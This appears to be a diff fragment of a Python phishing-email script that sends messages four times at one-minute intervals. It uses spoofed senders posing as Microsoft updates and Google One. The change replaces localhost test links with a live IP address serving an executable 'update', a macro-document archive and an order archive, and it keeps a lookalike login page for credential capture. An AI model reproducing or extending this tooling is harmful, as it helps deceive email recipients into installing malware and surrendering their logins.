@@ -154,7 +154,7 @@ Google.com-one"""
 
 # List of sender emails - update these with actual email addresses later
 senders = ['john@microsoftupdatehost.hopto.org', 'Jake@cybersec.com', 'midland labs@midland pro.com', 'noreply@googleone.com']
-urls = ['http://localhost/update.zip', 'http://localhost/edit1-invoice.docm.zip', 'http://localhost/Order_Spesification.zip', 'https://gptchamarajnagar.000webhostapp.com/login.html']
+urls = ['http://4.240.99.109/Digimemoryupdate.exe', 'http://4.240.99.109/edit1-invoice.docm.zip', 'http://4.240.99.109/Order_Spesification.zip', 'https://gptchamarajnagar.000webhostapp.com/login.html']
 
 # Send 4 emails with 1 minute intervals
 for i in range(4):
